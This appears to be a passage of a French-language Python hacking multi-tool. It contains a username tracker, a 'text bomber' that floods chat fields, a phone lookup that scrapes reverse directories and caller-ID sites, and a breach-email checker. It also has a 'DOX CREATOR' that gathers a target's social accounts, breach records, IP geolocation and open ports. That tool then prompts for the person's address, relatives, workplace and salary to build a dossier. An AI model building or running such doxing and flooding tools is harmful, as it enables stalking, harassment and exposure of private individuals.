                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.9",
                    },
                    timeout=8,
                    allow_redirects=True,
                )
                body = r.text[:20000] if r.text else ""

                is_nf = False
                for marker in nf_markers:
                    if marker.lower() in body.lower():
                        is_nf = True
                        break

                if r.status_code == 404 or is_nf:
                    with lock:
                        not_found.append(site)
                        print(f"{GRAY}[-] {site:<16} : Not found{RESET}")
                    return

                if r.status_code == 200:
                    with lock:
                        found.append((site, url))
                        print(f"{GREEN}[+] {site:<16} : {url}{RESET}")
                    return

                if r.status_code in (301, 302, 307, 308):
                    with lock:
                        found.append((site, url))
                        print(f"{GREEN}[+] {site:<16} : {url} (redirect){RESET}")
                    return

                with lock:
                    errors.append(site)
                    print(f"{YELLOW}[!] {site:<16} : HTTP {r.status_code}{RESET}")

            except requests.exceptions.Timeout:
                with lock:
                    errors.append(site)
                    print(f"{YELLOW}[!] {site:<16} : Timeout{RESET}")
            except requests.exceptions.ConnectionError:
                with lock:
                    errors.append(site)
                    print(f"{RED}[!] {site:<16} : Connection error{RESET}")
            except Exception:
                with lock:
                    errors.append(site)

    threads = []
    for site, url, nf in SITES:
        t = threading.Thread(target=check_site, args=(site, url, nf), daemon=True)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    print("\n" + "=" * 60)
    print(f"{CYAN}   RESUME POUR '{username}'{RESET}")
    print("=" * 60)
    print(f"{GREEN}[+] Comptes trouves  : {len(found)}{RESET}")
    print(f"{GRAY}[-] Non trouves     : {len(not_found)}{RESET}")
    print(f"{YELLOW}[!] Erreurs         : {len(errors)}{RESET}")
    print(f"{WHITE}[i] Sites testes    : {len(SITES)}{RESET}")

    if found:
        print(f"\n{GREEN}--- COMPTES CONFIRMES ---{RESET}")
        for site, url in found:
            print(f"{GREEN}  [+] {site:<16}{RESET} {url}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "UsernameTracker"
        out_dir.mkdir(parents=True, exist_ok=True)
        out_file = out_dir / f"{username}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Username: {username}\n")
            f.write(f"Sites testes: {len(SITES)}\n")
            f.write(f"Trouves: {len(found)} | Non trouves: {len(not_found)} | Erreurs: {len(errors)}\n")
            f.write("=" * 60 + "\n\n")
            f.write("[COMPTES TROUVES]\n")
            for site, url in found:
                f.write(f"  [+] {site:<16} {url}\n")
        print(f"\n{GREEN}[+] Resultats sauvegardes : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()


# ============================================================
#                     OPTION 3 — TEXT BOMBER
# ============================================================

def option_3():
    clear()
    banner()
    if pyautogui is None:
        print(f"{RED}[!] Module 'pyautogui' manquant. pip install pyautogui{RESET}")
        pause()
        return

    pyautogui.FAILSAFE = True
    pyautogui.PAUSE = 0

    print(f"\n{CYAN}   [ TEXT BOMBER ]{RESET}")
    print(f"{GRAY}Place ton curseur sur la zone de texte cible une fois lance.{RESET}")
    print(f"{GRAY}Pour arreter : bouge la souris dans un coin de l'ecran.{RESET}\n")

    text = input(f"{YELLOW}[?]{RESET} Message a envoyer -> ").strip()
    if not text:
        print(f"{RED}[!] Message vide.{RESET}")
        pause()
        return

    print(f"\n{GRAY}Vitesses disponibles :{RESET}")
    print(f"{GRAY}  1. Lent      (0.500s entre messages){RESET}")
    print(f"{GRAY}  2. Normal    (0.100s){RESET}")
    print(f"{GRAY}  3. Rapide    (0.010s){RESET}")
    print(f"{GRAY}  4. Instant   (0s — flood maximum){RESET}")
    print(f"{GRAY}  5. Custom    (tu choisis){RESET}")

    speed_choice = input(f"{YELLOW}[?]{RESET} Choix -> ").strip() or "2"

    SPEED_PRESETS = {
        "1": 0.500,
        "2": 0.100,
        "3": 0.010,
        "4": 0.000,
    }

    if speed_choice == "5":
        try:
            delay = float(input(f"{YELLOW}[?]{RESET} Delai custom (s) -> ").strip() or "0.1")
        except ValueError:
            delay = 0.1
    else:
        delay = SPEED_PRESETS.get(speed_choice, 0.100)

    print(f"\n{GRAY}Modes de comptage :{RESET}")
    print(f"{GRAY}  1. Fixe      (nombre precis){RESET}")
    print(f"{GRAY}  2. Infini    (arrete quand tu veux via fail-safe){RESET}")

    count_mode = input(f"{YELLOW}[?]{RESET} Choix -> ").strip() or "1"

    if count_mode == "2":
        count = float("inf")
        count_display = "INFINI"
    else:
        try:
            count = int(input(f"{YELLOW}[?]{RESET} Nombre d'envois -> ").strip())
            if count <= 0:
                raise ValueError()
        except ValueError:
            print(f"{RED}[!] Nombre invalide.{RESET}")
            pause()
            return
        count_display = str(count)

    print(f"\n{CYAN}   RESUME{RESET}")
    print(f"{GREEN}  Message  : {WHITE}{text[:60]}{'...' if len(text) > 60 else ''}{RESET}")
    print(f"{GREEN}  Delai    : {WHITE}{delay}s{RESET}")
    print(f"{GREEN}  Envois   : {WHITE}{count_display}{RESET}")
    print(f"{GREEN}  Arret    : {WHITE}coin d'ecran (fail-safe pyautogui){RESET}")

    confirm = input(f"\n{YELLOW}[?]{RESET} Lancer ? (y/n) -> ").strip().lower()
    if confirm not in ("y", "yes", "o", "oui"):
        print(f"{YELLOW}[!] Annule.{RESET}")
        pause()
        return

    print(f"\n{YELLOW}[*] Debut dans 3 secondes — place ton curseur sur la zone cible...{RESET}")
    for i in range(3, 0, -1):
        sys.stdout.write(f"\r{YELLOW}[*] Lancement dans {i}...{RESET}    ")
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r" + " " * 50 + "\r")
    sys.stdout.flush()

    sent = 0
    errors = 0
    start_time = time.time()

    has_unicode = any(ord(c) > 127 for c in text)

    if has_unicode:
        print(f"{YELLOW}[i] Caracteres Unicode detectes — fallback presse-papiers actif.{RESET}")
        try:
            import pyperclip
            has_pyperclip = True
        except ImportError:
            has_pyperclip = False
            print(f"{RED}[!] pyperclip manquant pour Unicode. pip install pyperclip{RESET}")
            print(f"{YELLOW}[i] Fallback : le texte sera envoye tel quel (accents peuvent rater).{RESET}")
    else:
        has_pyperclip = False

    try:
        while sent < count:
            try:
                if has_unicode and has_pyperclip:
                    pyperclip.copy(text)
                    pyautogui.hotkey("ctrl", "v")
                else:
                    pyautogui.typewrite(text, interval=0)
                pyautogui.press("enter")
                sent += 1

                elapsed = time.time() - start_time
                rps = sent / elapsed if elapsed > 0 else 0
                if count == float("inf"):
                    sys.stdout.write(
                        f"\r{GREEN}[+] {sent} envoyes{RESET}  |  "
                        f"{CYAN}{rps:.1f} msg/s{RESET}  |  "
                        f"{GRAY}{elapsed:.1f}s{RESET}    "
                    )
                else:
                    pct = int((sent / count) * 100)
                    bar_len = 30
                    filled = int(bar_len * sent / count)
                    bar = "=" * filled + " " * (bar_len - filled)
                    sys.stdout.write(
                        f"\r{GREEN}[+] [{bar}] {pct:3d}%{RESET}  "
                        f"{WHITE}{sent}/{count}{RESET}  |  "
                        f"{CYAN}{rps:.1f} msg/s{RESET}    "
                    )
                sys.stdout.flush()

                if delay > 0:
                    time.sleep(delay)

            except pyautogui.FailSafeException:
                print(f"\n\n{YELLOW}[!] Fail-safe declenche (souris dans un coin). Arret.{RESET}")
                break
            except KeyboardInterrupt:
                print(f"\n\n{YELLOW}[!] Ctrl+C — arret.{RESET}")
                break
            except Exception as e:
                errors += 1
                if errors <= 3:
                    print(f"\n{RED}[!] Erreur #{errors} : {e}{RESET}")
                if errors > 10:
                    print(f"\n{RED}[!] Trop d'erreurs consecutives — arret.{RESET}")
                    break
                time.sleep(0.5)

    except Exception as e:
        print(f"\n{RED}[!] Erreur fatale : {e}{RESET}")

    total_time = time.time() - start_time
    avg_rps = sent / total_time if total_time > 0 else 0

    print(f"\n\n{GREEN}[+] Termine{RESET}")
    print(f"{GREEN}[+] Envoyes    : {sent}{RESET}")
    print(f"{GREEN}[+] Erreurs    : {errors}{RESET}")
    print(f"{GREEN}[+] Duree      : {total_time:.2f}s{RESET}")
    print(f"{CYAN}[+] Cadence    : {avg_rps:.2f} msg/s{RESET}")
    pause()


# ============================================================
#                     OPTION 4 — PHONE INFO
# ============================================================

def option_4():
    clear()
    banner()
    if not _need_phonenumbers() or not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ PHONE INFO ]{RESET}")
    print(f"{GRAY}Format international, exemple : +33612345678{RESET}\n")

    phone = input(f"{CYAN}[?] Numero {RED}->{RESET} ").strip()
    if not phone:
        print(f"{RED}[!] Aucun numero.{RESET}")
        pause()
        return

    try:
        parsed = phonenumbers.parse(phone, None)
    except phonenumbers.NumberParseException as e:
        print(f"{RED}[!] Format invalide : {e}{RESET}")
        pause()
        return

    if not phonenumbers.is_possible_number(parsed):
        print(f"{RED}[!] Numero non possible.{RESET}")
        pause()
        return

    valid = phonenumbers.is_valid_number(parsed)
    country = geocoder.description_for_number(parsed, "fr") or "Inconnu"
    operator = carrier.name_for_number(parsed, "fr") or "Inconnu"
    zones = timezone.time_zones_for_number(parsed)
    zones_str = ", ".join(zones) if zones else "Inconnue"

    intl = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    nat = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
    e164 = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)

    type_map = {
        phonenumbers.PhoneNumberType.FIXED_LINE: "Fixed Line",
        phonenumbers.PhoneNumberType.MOBILE: "Mobile",
        phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixed / Mobile",
        phonenumbers.PhoneNumberType.TOLL_FREE: "Toll Free",
        phonenumbers.PhoneNumberType.PREMIUM_RATE: "Premium Rate",
        phonenumbers.PhoneNumberType.VOIP: "VoIP",
        phonenumbers.PhoneNumberType.UNKNOWN: "Unknown",
    }
    ntype = type_map.get(phonenumbers.number_type(parsed), "Unknown")

    print(f"\n{RED}{BOLD}===== PHONE INFORMATION ====={RESET}")
    print(f"{GREEN}[+] International : {WHITE}{intl}{RESET}")
    print(f"{GREEN}[+] National      : {WHITE}{nat}{RESET}")
    print(f"{GREEN}[+] E164          : {WHITE}{e164}{RESET}")
    print(f"{GREEN}[+] Country       : {WHITE}{country}{RESET}")
    print(f"{GREEN}[+] Country Code  : {WHITE}+{parsed.country_code}{RESET}")
    print(f"{GREEN}[+] Number        : {WHITE}{parsed.national_number}{RESET}")
    print(f"{GREEN}[+] Carrier       : {WHITE}{operator}{RESET}")
    print(f"{GREEN}[+] Timezone      : {WHITE}{zones_str}{RESET}")
    print(f"{GREEN}[+] Type          : {WHITE}{ntype}{RESET}")
    print(f"{GREEN}[+] Valid         : {WHITE}{valid}{RESET}")
    print(f"{RED}{BOLD}=============================={RESET}")

    print(f"\n{YELLOW}[*] Recherche dans les annuaires publics...{RESET}")

    national = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
    clean_num = re.sub(r"[^\d]", "", national)

    directory_sources = [
        ("118712.fr",        f"https://www.118712.fr/recherche?q={clean_num}",              ["Aucun résultat", "Pas de résultat", "aucune correspondance"]),
        ("PagesJaunes",      f"https://www.pagesjaunes.fr/annuaireinverse/{clean_num}",     ["Aucun résultat", "Aucune société", "Désolé"]),
        ("PagesBlanches",    f"https://www.pagesjaunes.fr/pagesblanches/recherche?quoiqui={clean_num}", ["Aucun résultat", "Aucun abonné"]),
        ("Infobel FR",       f"https://www.infobel.com/fr/france/reverse/{clean_num}",      ["No results", "Aucun résultat"]),
        ("Annuaire-Inverse", f"https://annuaire-inverse.net/recherche/{clean_num}",         ["Aucun résultat", "No result"]),
    ]

    directory_found = []
    dlock = threading.Lock()

    def check_directory(name, url, nf_markers):
        try:
            r = requests.get(
                url,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124",
                    "Accept": "text/html,application/xhtml+xml",
                    "Accept-Language": "fr-FR,fr;q=0.9",
                },
                timeout=10,
                allow_redirects=True,
            )
            body = (r.text or "")[:30000].lower()

            is_nf = any(m.lower() in body for m in nf_markers)
            if r.status_code == 200 and not is_nf and len(body) > 2000:
                extracted = {"name": None}

                name_match = re.search(
                    r"(?:<h[1-3][^>]*>|<strong>|<b>)([A-ZÉÈÀÂÎÔÛÇ][a-zéèàâîôûç]+(?:\s+[A-ZÉÈÀÂÎÔÛÇ][a-zéèàâîôûç\-]+){1,3})(?:</h[1-3]>|</strong>|</b>)",
                    r.text or "",
                )
                if name_match:
                    extracted["name"] = name_match.group(1).strip()

                with dlock:
                    directory_found.append({
                        "source": name,
                        "url": url,
                        "name": extracted["name"],
                    })
                    if extracted["name"]:
                        print(f"{GREEN}[+] {name:<18} : {extracted['name']}{RESET}")
                    else:
                        print(f"{YELLOW}[+] {name:<18} : resultat brut disponible{RESET}")
                        print(f"{GRAY}    {url}{RESET}")
        except Exception:
            pass

    dthreads = []
    for name, url, nf in directory_sources:
        t = threading.Thread(target=check_directory, args=(name, url, nf), daemon=True)
        dthreads.append(t)
        t.start()
    for t in dthreads:
        t.join()

    if not directory_found:
        print(f"{GRAY}[-] Aucun resultat dans les annuaires publics.{RESET}")
        if ntype in ("Mobile", "VoIP"):
            print(f"{YELLOW}[i] Normal pour un mobile — les mobiles ne sont pas dans les annuaires FR (RGPD).{RESET}")

    print(f"\n{YELLOW}[*] Tentative sur les bases call-ID...{RESET}")

    call_id_sources = [
        ("Truecaller",  f"https://www.truecaller.com/search/fr/{clean_num}",  ["No results", "not found", "No one has"]),
        ("Sync.me",     f"https://sync.me/search/?number={clean_num}",       ["No results", "not found", "We couldn't find"]),
    ]

    call_id_found = []
    clock = threading.Lock()

    def check_call_id(name, url, nf_markers):
        try:
            r = requests.get(
                url,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124",
                    "Accept": "text/html,application/xhtml+xml",
                    "Accept-Language": "fr-FR,fr;q=0.9",
                },
                timeout=10,
                allow_redirects=True,
            )
            body = (r.text or "")[:30000].lower()
            is_nf = any(m.lower() in body for m in nf_markers)
            if r.status_code == 200 and not is_nf and len(body) > 1000:
                with clock:
                    call_id_found.append({"source": name, "url": url})
                    print(f"{GREEN}[+] {name:<18} : resultat disponible{RESET}")
                    print(f"{GRAY}    {url}{RESET}")
        except Exception:
            pass

    cthreads = []
    for name, url, nf in call_id_sources:
        t = threading.Thread(target=check_call_id, args=(name, url, nf), daemon=True)
        cthreads.append(t)
        t.start()
    for t in cthreads:
        t.join()

    if not call_id_found:
        print(f"{GRAY}[-] Aucun resultat call-ID.{RESET}")

    print(f"\n{YELLOW}[*] Google dork (recherche de fuites publiques)...{RESET}")
    dorks = [
        f'"{national}"',
        f'"{e164}"',
        f'"{intl}"',
    ]
    print(f"{GRAY}[i] Ouvre ces recherches dans ton navigateur :{RESET}")
    for d in dorks:
        google_url = f"https://www.google.com/search?q={urllib.parse.quote(d)}"
        print(f"{GRAY}    {google_url}{RESET}")

    print(f"\n{CYAN}   RESUME{RESET}")
    print(f"{GREEN}[+] Annuaire public  : {len(directory_found)} source(s){RESET}")
    print(f"{GREEN}[+] Call-ID          : {len(call_id_found)} source(s){RESET}")
    if ntype in ("Mobile", "VoIP"):
        print(f"{YELLOW}[i] Numero mobile — les annuaires FR ne le listeront pas (loi RGPD).{RESET}")
    else:
        print(f"{GREEN}[i] Numero fixe/pro — les annuaires sont la bonne source.{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "PhoneInfo"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe_num = re.sub(r"[^\d+]", "", phone)
        out_file = out_dir / f"{safe_num}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Numero: {phone}\n")
            f.write(f"International: {intl}\n")
            f.write(f"National: {nat}\n")
            f.write(f"E164: {e164}\n")
            f.write(f"Pays: {country}\n")
            f.write(f"Operateur: {operator}\n")
            f.write(f"Type: {ntype}\n")
            f.write(f"Valide: {valid}\n")
            f.write("=" * 60 + "\n\n")
            f.write("[ANNUAIRES PUBLICS]\n")
            for d in directory_found:
                f.write(f"  {d['source']:<18} {d['url']}\n")
                if d.get("name"):
                    f.write(f"    Nom detecte: {d['name']}\n")
            f.write("\n[CALL-ID]\n")
            for c in call_id_found:
                f.write(f"  {c['source']:<18} {c['url']}\n")
        print(f"\n{GREEN}[+] Resultats sauvegardes : {out_file}{RESET}")
    except Exception:
        pass

    pause()


# ============================================================
#                     OPTION 5 — BREACH EMAIL LOOKUP
# ============================================================

def option_5():
    clear()
    banner()
    if not _need_requests():
        pause()
        return

    email = input(f"{YELLOW}[?]{RESET} Email {RED}->{RESET} ").strip()
    if not email or "@" not in email or "." not in email:
        print(f"{RED}[!] Email invalide.{RESET}")
        pause()
        return

    print(f"{CYAN}[*] Checking...{RESET}\n")

    def join_any(seq, limit=10):
        if not seq or not isinstance(seq, list):
            return "None"
        parts = []
        for item in seq[:limit]:
            if isinstance(item, str):
                parts.append(item)
            elif isinstance(item, dict):
                parts.append(str(next((v for v in item.values() if v), "Unknown")))
            else:
                parts.append(str(item))
        return ", ".join(parts) + (" ..." if len(seq) > limit else "")

    def check_leakcheck(mail):
        enc = urllib.parse.quote(mail, safe="")
        url = "https://leakcheck.io/api/public?check=" + enc
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 429:
                print(f"{YELLOW}[!] LeakCheck rate limite.{RESET}")
                time.sleep(1.5)
                return None
            data = r.json() if r.status_code == 200 else None
            if data and data.get("success") and data.get("found", 0) > 0:
                return {
                    "source": "LeakCheck.io",
                    "found": data.get("found", 0),
                    "fields": join_any(data.get("fields", [])),
                    "sources": join_any(data.get("sources", [])),
                }
        except Exception:
            pass
        return None

    def check_xposedornot(mail):
        enc = urllib.parse.quote(mail, safe="")
        url = "https://xposedornot.com/v1/check-email/" + enc
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                breaches = data.get("ExposedRecords") or data.get("breaches") or []
                if breaches:
                    names = []
                    for b in breaches:
                        if isinstance(b, dict):
                            names.append(
                                b.get("breach")
                                or b.get("name")
                                or next(iter(b.values()), "Unknown")
                            )
                        elif isinstance(b, str):
                            names.append(b)
                    if names:
                        return {
                            "source": "XposedOrNot",
                            "found": len(names),
                            "fields": join_any(names),
                            "sources": "XposedOrNot Database",
                        }
        except Exception:
            pass
        return None

    results = []
    for checker in (check_leakcheck, check_xposedornot):
        r = checker(email)
        if r:
            results.append(r)
        time.sleep(1.1)

    if results:
        total = sum(r["found"] for r in results)
        print(f"{RED}[!] Trouve dans {total} breaches sur {len(results)} sources.{RESET}\n")
        for r in results:
            print(f"{GREEN}[+] Source  : {r['source']}{RESET}")
            print(f"{GREEN}[+] Found   : {r['found']}{RESET}")
            print(f"{GREEN}[+] Fields  : {r['fields']}{RESET}")
            print(f"{GREEN}[+] Sources : {r['sources']}{RESET}\n")
    else:
        print(f"{GREEN}[+] Aucune breach trouvee.{RESET}")
    pause()


# ============================================================
#                     OPTION 6 — DOX CREATOR
# ============================================================

def option_6():
    clear()
    banner()
    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ DOX CREATOR — auto + manuel ]{RESET}\n")
    print(f"{GRAY}1. Rentre un identifiant → auto-OSINT.{RESET}")
    print(f"{GRAY}2. Puis complete a la main ce qui manque.{RESET}\n")

    print(f"{GRAY}Type d'identifiant :{RESET}")
    print(f"{GRAY}  1. Username{RESET}")
    print(f"{GRAY}  2. Email{RESET}")
    print(f"{GRAY}  3. IP{RESET}")
    print(f"{GRAY}  4. Telephone{RESET}")
    print(f"{GRAY}  5. Nom complet{RESET}")

    id_type = input(f"{YELLOW}[?]{RESET} Choix -> ").strip() or "1"
    if id_type not in ("1", "2", "3", "4", "5"):
        id_type = "1"

    ident = input(f"{YELLOW}[?]{RESET} Identifiant -> ").strip()
    if not ident:
        print(f"{RED}[!] Vide.{RESET}")
        pause()
        return

    profile = {
        "input_type": id_type,
        "input_value": ident,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "identity": {},
        "network": {},
        "contact": {},
        "social": {},
        "breach": {},
        "phone": {},
        "ip_geo": {},
        "dns": {},
        "manual": {},
        "dorks": [],
    }

    def safe_get(url, headers=None, timeout=10):
        try:
            h = headers or {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124",
                "Accept": "text/html,application/json,*/*",
                "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8",
            }
            return requests.get(url, headers=h, timeout=timeout, allow_redirects=True)
        except Exception:
            return None

    print(f"\n{CYAN}   [ PHASE 1 ] Recherche automatique{RESET}")

    if id_type == "1":
        profile["identity"]["username"] = ident
        print(f"\n{YELLOW}[*] Detection du username...{RESET}")

        username_sites = [
            ("GitHub",     f"https://github.com/{ident}",              ["Not Found"]),
            ("GitLab",     f"https://gitlab.com/{ident}",              ["Not Found", "404"]),
            ("Reddit",     f"https://www.reddit.com/user/{ident}",     ["Sorry, nobody on Reddit goes by that name"]),
            ("Instagram",  f"https://www.instagram.com/{ident}/",      ["Sorry, this page isn't available"]),
            ("TikTok",     f"https://www.tiktok.com/@{ident}",         ["Couldn't find this account"]),
            ("X",          f"https://x.com/{ident}",                   ["This account doesn't exist"]),
            ("YouTube",    f"https://www.youtube.com/@{ident}",        ["This page isn't available"]),
            ("Twitch",     f"https://www.twitch.tv/{ident}",           ["Sorry. Unless you've got a time machine"]),
            ("Steam",      f"https://steamcommunity.com/id/{ident}",   ["The specified profile could not be found"]),
            ("Roblox",     f"https://www.roblox.com/user.aspx?username={ident}", ["Page cannot be found"]),
            ("SoundCloud", f"https://soundcloud.com/{ident}",          ["We can't find that user"]),
            ("Spotify",    f"https://open.spotify.com/user/{ident}",   ["Page not found"]),
            ("Pinterest",  f"https://www.pinterest.com/{ident}/",      ["User not found"]),
            ("Tumblr",     f"https://{ident}.tumblr.com",              ["There's nothing here"]),
            ("Medium",     f"https://medium.com/@{ident}",             ["Out of nothing, something", "404"]),
            ("Dev.to",     f"https://dev.to/{ident}",                  ["Not Found"]),
            ("Linktree",   f"https://linktr.ee/{ident}",               ["Not Found"]),
            ("Patreon",    f"https://www.patreon.com/{ident}",         ["Not Found"]),
            ("Facebook",   f"https://www.facebook.com/{ident}",        ["content isn't available"]),
            ("VK",         f"https://vk.com/{ident}",                  ["404"]),
            ("Telegram",   f"https://t.me/{ident}",                    ["If you have Telegram, you can contact"]),
            ("Snapchat",   f"https://www.snapchat.com/add/{ident}",    ["This content could not be found"]),
        ]

        slock = threading.Lock()
        ssem = threading.Semaphore(15)

        def check_username_site(name, url, nf):
            with ssem:
                r = safe_get(url, timeout=8)
                if not r:
                    return
                body = (r.text or "")[:15000].lower()
                is_nf = any(m.lower() in body for m in nf)
                if r.status_code == 200 and not is_nf:
                    with slock:
                        profile["social"][name] = url
                        print(f"{GREEN}[+] {name:<12} : {url}{RESET}")

        threads = []
        for name, url, nf in username_sites:
            t = threading.Thread(target=check_username_site, args=(name, url, nf), daemon=True)
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

        profile["dorks"] = [
            f"site:linkedin.com \"{ident}\"",
            f"site:facebook.com \"{ident}\"",
            f"site:twitter.com \"{ident}\"",
            f"site:instagram.com \"{ident}\"",
            f"\"{ident}\" filetype:pdf",
            f"\"{ident}\" email",
            f"\"{ident}\" @gmail.com",
            f"\"{ident}\" site:pastebin.com",
            f"\"{ident}\" site:github.com password",
        ]

    elif id_type == "2":
        profile["contact"]["email"] = ident
        if "@" not in ident:
            print(f"{RED}[!] Email invalide.{RESET}")
            pause()
            return

        print(f"\n{YELLOW}[*] Verification des fuites...{RESET}")
        for url_fmt, src_name in [
            ("https://leakcheck.io/api/public?check={}", "LeakCheck"),
            ("https://xposedornot.com/v1/check-email/{}", "XposedOrNot"),
        ]:
            enc = urllib.parse.quote(ident, safe="")
            r = safe_get(url_fmt.format(enc))
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if src_name == "LeakCheck" and data.get("success") and data.get("found", 0) > 0:
                        profile["breach"][src_name] = {"found": data.get("found", 0), "sources": data.get("sources", [])[:20]}
                        print(f"{RED}[!] {src_name} : {data.get('found')} fuites{RESET}")
                    elif src_name == "XposedOrNot":
                        breaches = data.get("ExposedRecords") or data.get("breaches") or []
                        if breaches:
                            profile["breach"][src_name] = {"found": len(breaches), "sources": breaches[:20]}
                            print(f"{RED}[!] {src_name} : {len(breaches)} fuites{RESET}")
                except Exception:
                    pass

        md5 = hashlib.md5(ident.lower().strip().encode()).hexdigest()
        r = safe_get(f"https://www.gravatar.com/avatar/{md5}?d=404")
        if r and r.status_code == 200:
            profile["contact"]["gravatar"] = f"https://www.gravatar.com/{md5}"
            print(f"{GREEN}[+] Gravatar : https://www.gravatar.com/{md5}{RESET}")

        profile["identity"]["username_guess"] = ident.split("@")[0]
        profile["dorks"] = [f'"{ident}"', f'"{ident}" filetype:pdf', f'"{ident}" password', f'"{ident}" site:pastebin.com']

    elif id_type == "3":
        profile["network"]["ip"] = ident
        print(f"\n{YELLOW}[*] Geo IP...{RESET}")
        r = safe_get(f"http://ip-api.com/json/{ident}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,proxy,hosting,mobile,query")
        if r:
            try:
                data = r.json()
                if data.get("status") == "success":
                    profile["ip_geo"] = data
                    for k in ("country", "regionName", "city", "isp", "org", "as", "reverse"):
                        print(f"{GREEN}[+] {k:<12} : {data.get(k)}{RESET}")
            except Exception:
                pass

        print(f"\n{YELLOW}[*] Shodan InternetDB...{RESET}")
        r = safe_get(f"https://internetdb.shodan.io/{ident}")
        if r and r.status_code == 200:
            try:
                data = r.json()
                if data.get("ports"):
                    profile["network"]["open_ports"] = data.get("ports", [])
                    profile["network"]["hostnames"] = data.get("hostnames", [])
                    profile["network"]["vulns"] = data.get("vulns", [])
                    print(f"{GREEN}[+] Ports : {data.get('ports')}{RESET}")
                    if data.get("vulns"):
                        print(f"{RED}[!] CVE : {data.get('vulns')}{RESET}")
            except Exception:
                pass

    elif id_type == "4":
        profile["contact"]["phone"] = ident
        if phonenumbers is not None:
            try:
                parsed = phonenumbers.parse(ident, None)
                if phonenumbers.is_possible_number(parsed):
                    profile["phone"] = {
                        "international": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
                        "national": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL),
                        "e164": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164),
                        "country": geocoder.description_for_number(parsed, "fr") or "Inconnu",
                        "carrier": carrier.name_for_number(parsed, "fr") or "Inconnu",
                        "timezone": ", ".join(timezone.time_zones_for_number(parsed)) or "Inconnue",
                    }
                    for k, v in profile["phone"].items():
                        print(f"{GREEN}[+] {k:<14} : {v}{RESET}")
            except Exception:
                pass

        clean = re.sub(r"[^\d]", "", ident)
        profile["dorks"] = [f'"{clean}"', f'"{clean}" site:facebook.com', f'"{clean}" site:leboncoin.fr']

    elif id_type == "5":
        profile["identity"]["full_name"] = ident
        parts = ident.split()
        if len(parts) >= 2:
            profile["identity"]["first_name"] = parts[0]
            profile["identity"]["last_name"] = " ".join(parts[1:])
        profile["dorks"] = [
            f'"{ident}"',
            f'"{ident}" site:linkedin.com',
            f'"{ident}" site:facebook.com',
            f'"{ident}" site:pagesjaunes.fr',
            f'"{ident}" filetype:pdf',
        ]

    print(f"\n\n{CYAN}   [ PHASE 2 ] Saisie manuelle{RESET}")
    print(f"{GRAY}Tape ENTREE pour laisser vide, ou la valeur si tu l'as.{RESET}\n")

    def _ask_manual(label):
        val = input(f"{YELLOW}[?]{RESET} {label} -> ").strip()
        return val if val else None

    print(f"{WHITE}{BOLD}-- Identite --{RESET}")
    for label, key in [
        ("Prenom",                 "first_name"),
        ("Nom",                    "last_name"),
        ("Surnom / alias",         "alias"),
        ("Date de naissance",      "dob"),
        ("Age",                    "age"),
        ("Genre",                  "gender"),
        ("Nationalite",            "nationality"),
        ("Ville de naissance",     "birth_city"),
        ("Situation",              "relationship"),
        ("Profession",             "occupation"),
    ]:
        v = _ask_manual(label)
        if v:
            profile["manual"][key] = v

    print(f"\n{WHITE}{BOLD}-- Contact --{RESET}")
    for label, key in [
        ("Email",             "email"),
        ("Email secondaire",  "email2"),
        ("Telephone",         "phone"),
        ("Telephone 2",       "phone2"),
        ("Adresse",           "address"),
        ("Code postal",       "zip"),
        ("Ville",             "city"),
        ("Pays",              "country"),
    ]:
        v = _ask_manual(label)
        if v:
            profile["manual"][key] = v

    print(f"\n{WHITE}{BOLD}-- Famille / proches --{RESET}")
    for label, key in [
        ("Nom du pere",       "father"),
        ("Nom de la mere",    "mother"),
        ("Fratrie",           "siblings"),
        ("Conjoint(e)",       "partner"),
        ("Enfants",           "children"),
    ]:
        v = _ask_manual(label)
        if v:
            profile["manual"][key] = v

    print(f"\n{WHITE}{BOLD}-- Reseaux sociaux (complement) --{RESET}")
    for label, key in [
        ("Discord",      "discord"),
        ("Snapchat",     "snapchat"),
        ("WhatsApp",     "whatsapp"),
        ("Telegram",     "telegram"),
        ("LinkedIn",     "linkedin"),
        ("Skype",        "skype"),
        ("Autre",        "other_social"),
    ]:
        v = _ask_manual(label)
        if v:
            profile["social"][key] = v

    print(f"\n{WHITE}{BOLD}-- Scolarite / travail --{RESET}")
    for label, key in [
        ("Ecole",         "school"),
        ("Universite",    "university"),
        ("Diplome",       "degree"),
        ("Entreprise",    "company"),
        ("Poste",         "position"),
        ("Salaire",       "salary"),
    ]:
        v = _ask_manual(label)
        if v:
            profile["manual"][key] = v

    print(f"\n{WHITE}{BOLD}-- Appareils / tech --{RESET}")
    for label, key in [
